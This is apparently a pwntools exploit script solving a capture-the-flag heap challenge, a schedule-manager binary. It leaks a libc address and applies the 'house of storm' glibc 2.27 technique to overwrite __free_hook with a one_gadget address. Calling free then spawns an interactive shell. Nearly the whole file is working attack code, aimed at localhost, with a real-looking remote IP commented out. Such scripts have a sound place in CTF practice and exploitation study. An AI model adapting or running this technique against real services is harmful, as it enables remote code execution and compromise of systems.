from pwn import *
import time

LOCAL = 0
if LOCAL:
    p = process('../src/chall')
else:
    #p = remote('103.152.242.243', 2000)
    p = remote('localhost', 9999)

def create_schedule(description, start_day, start_month, start_year, start_hour, start_minute, start_second, end_day, end_month, end_year, end_hour, end_minute, end_second):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'> ')
    p.sendline(description.encode())
    p.sendline(str(start_day).encode())
    p.sendline(str(start_month).encode())
    p.sendline(str(start_year).encode())
    p.sendline(str(start_hour).encode())
    p.sendline(str(start_minute).encode())
    p.sendline(str(start_second).encode())
    p.sendline(str(end_day).encode())
    p.sendline(str(end_month).encode())
    p.sendline(str(end_year).encode())
    p.sendline(str(end_hour).encode())
    p.sendline(str(end_minute).encode())
    p.sendline(str(end_second).encode())
    p.recvuntil(b'Schedule created successfully.\n\n')

def edit_schedule_description(idx, description):
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.sendline(str(idx).encode())
    p.sendline(b'1')
    p.sendline(description.encode())
    p.recvuntil(b'Schedule edited successfully.\n\n')

def view_schedule():
    p.recvuntil(b'> ')
    p.sendline(b'4')
    return p.recvuntil(b'\n\n')

def delete_schedule(idx):
    p.sendline(b'3')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Schedule deleted successfully.\n\n')

def add_favorite(idx, edit=False, description=b''):
    p.recvuntil(b'> ')
    p.sendline(b'5')
    p.sendline(str(idx).encode())
    if (edit):
        p.sendline(b'1')
        p.sendline(description)
        p.recvuntil(b'Schedule added to favorite list successfully.\n\n')
    else:
        p.sendline(b'0')

def edit_favorite(idx, description):
    p.recvuntil(b'> ')
    p.sendline(b'6')
    p.sendline(str(idx).encode())
    p.sendline(description)
    p.recvuntil(b'Schedule edited successfully.\n\n')

# get leak address
create_schedule('AAAA', 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1)
edit_schedule_description(0, '0')
malloc_hook = u64(view_schedule().split(b'\n')[0][3:].ljust(8, b'\x00'))
free_hook = 0x1cb8 + malloc_hook # for libc 2.27
print('malloc_hook =', hex(malloc_hook))
print('free_hook =', hex(free_hook))

#####################################################################################
# house of storm                                                                    #
# https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_storm.c    #
#####################################################################################
# we get this from experimental result of that PoC
alloc_size = 0x46
fake_chunk = free_hook - 0x10
print('fake_chunk =', hex(fake_chunk))
shift_amount = 5

create_schedule('A' * alloc_size + '\x00', 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1) # for last calloc, idx 1
create_schedule('A' * 0x10 + '\x00', 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1) # for new unsorted bin, idx 2
create_schedule('A' * 0x4e8 + '\x00', 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1) # unsorted bin, idx 3

# dummy
x = 3
for i in range(x):
    create_schedule('A' * 0x10 + '\x00', 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1)

# fill up tcache
for i in range(7):
    create_schedule('A' * alloc_size + '\x00', 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1)

for i in range(7):
    delete_schedule(i + 4 + x)

create_schedule('A' * 0x4d8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1) # large bin, idx 10

delete_schedule(10) # free(large_bin)
delete_schedule(3) # free(unsorted_bin)
edit_schedule_description(2, 'B' * 0x4e8) # new unsorted bin
delete_schedule(2) # free the new unsorted bin
add_favorite(2, True, b'B' * 8 + p64(fake_chunk))
add_favorite(10, True, b'B' * 8 + p64(fake_chunk + 8) + b'B' * 8 + p64(fake_chunk - 0x18 - shift_amount))
add_favorite(1, True, b'A' * alloc_size) # padding until size of alloc_size
add_favorite(1, False)

libc_base = malloc_hook - 0x3ebc30
one_gadget = 0x4f432 + libc_base
print('one_gadget =', hex(one_gadget))
edit_favorite(3, p64(one_gadget)) # set free hook

#somehow, this will spawn the shell because of free is called and one_gadget constraint is fulfilled
p.sendline(b'3') 
p.sendline(b'0')
p.interactive()